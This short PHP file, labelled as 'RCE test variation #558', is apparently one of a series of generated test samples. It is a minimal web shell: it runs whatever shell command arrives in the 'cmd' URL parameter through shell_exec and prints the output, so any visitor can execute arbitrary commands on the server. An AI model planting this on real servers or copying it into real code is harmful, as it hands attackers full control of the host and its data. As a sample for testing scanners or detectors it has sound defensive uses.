<?php
// RCE test variation #558
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>